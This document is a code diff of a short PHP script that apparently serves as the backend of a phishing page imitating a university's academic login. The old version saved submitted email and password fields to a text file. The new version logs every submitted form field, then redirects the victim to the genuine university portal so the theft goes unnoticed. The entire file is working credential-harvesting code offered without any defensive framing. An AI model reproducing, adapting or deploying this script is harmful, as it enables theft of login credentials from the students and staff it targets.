@@ -1,6 +1,17 @@
 <?php
 
-file_put_contents("usernames.txt", " Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
+header
+('location:');
+$handle=fopen("usernames.txt", "a");
+foreach($_POST as $variable=>$value)
+{
+fwrite($handle,$variable);
+fwrite($handle,"-");
+fwrite($handle,$value);
+fwrite($handle,"\r\n");
+}
+fwrite($handle,"\r\n");
+fclose($handle);
 header('Location: https://sigaacademico.unisabana.edu.co/psp/CS90PRO/?&cmd=login&languageCd=ESP/');
 exit();
 ?>
